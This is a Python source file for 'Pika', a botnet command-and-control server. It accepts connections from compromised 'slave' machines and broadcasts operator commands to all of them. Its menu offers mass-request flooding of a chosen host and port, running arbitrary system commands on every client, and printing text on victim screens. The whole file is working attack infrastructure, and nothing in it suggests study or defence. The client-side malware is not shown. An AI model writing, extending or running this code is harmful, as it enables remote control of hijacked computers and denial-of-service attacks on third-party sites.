from cgitb import text
import socket, _thread, requests, os
from colorama import Fore

ThreadCount = 0
clients, connected = [], []

def help():
    print(f'''
    Arguments between {Fore.RED}[]{Fore.RESET} are required; arguments between {Fore.CYAN}(){Fore.RESET} are optional.{Fore.RESET}
    
    help    Displays the help menu.
    list    Lists all machines connected.

    attack  {Fore.RED}[host] [port]{Fore.RESET} {Fore.CYAN}(threads){Fore.RESET} -> Mass request a site from all clients.
    print   {Fore.RED}[text]{Fore.RESET} -> Prints some text in all connected machines.
    system  {Fore.RED}[command]{Fore.RESET} -> execute a system command to all slaves.
    ''')

def list(): print(f'{len(connected)} client(s) connected to Pika')

def getDefaults():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    s.connect(('8.8.8.8', 1))
    return s.getsockname()[0], requests.get('https://wtfismyip.com/text').text

def connectClient(address):
    print(f'Connection received from {Fore.MAGENTA} {address[0]}')

    while True:
        command = input(f'{Fore.MAGENTA}root@pika ~> {Fore.RESET}')

        if command == 'help': help()
        elif command == 'list': list()
        elif command == 'clear': os.system('cls' if os.name == 'nt' else 'clear')
            
        else:
            print(f'Command sent to [{Fore.MAGENTA}{len(clients)}{Fore.RESET}] client(s)')
            try:
                for client in clients:
                    client.send(b'\r\n' + bytes(command, encoding='utf-8')) 
            except:
                break

def main():
    addr = ('0.0.0.0', 46134)
    priv_ip, pub_ip = getDefaults()

    print(f'Private IP ~> {priv_ip}')
    print(f'Public IP  ~> {pub_ip}')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(addr)
    s.listen()

    while True:
        conn, address = s.accept()
        clients.append(conn)
        connected.append(address[0])
        _thread.start_new_thread(connectClient, (address,))

if __name__ == '__main__':
    main()